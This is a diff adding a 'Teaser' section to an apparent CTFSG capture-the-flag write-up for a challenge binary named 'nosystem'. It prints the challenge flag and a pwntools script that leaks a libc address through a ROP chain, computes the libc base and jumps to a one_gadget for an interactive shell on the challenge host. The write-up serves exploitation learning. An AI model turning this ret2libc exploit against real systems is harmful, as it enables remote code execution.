@@ -212,3 +212,39 @@ We 🔥 our script. And voila!
 ```
 CTFSG{n0_5y5t3m_n0_pr0bl3m_p0p_p0p_r3t}
 ```
+
+---
+
+### Teaser
+
+Do we even need a chain 2... or even need to manually find gadgets for chain 1?
+
+```py
+HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
+PORT = 30401
+
+context.binary = elf = ELF('nosystem')
+libc = ELF('libc6_2.19-0ubuntu6.15_amd64.so')
+
+p = remote(HOST, PORT)
+
+rop = ROP(elf)
+rop.puts(elf.got.puts)
+rop.main()
+
+p.sendline(flat({ 264: rop.chain()}))
+
+p.recvuntil("@!")
+received = p.recvline()
+
+leak = u64(received.ljust(8, b"\x00"))
+leak = leak - 2814749767106560
+base = leak - libc.sym['puts']
+libc.address = base
+
+one_gadget = 0x46428 # rax == NULL
+
+p.sendline(flat({ 264: p64(base+one_gadget)}))
+p.clean()
+p.interactive()
+```
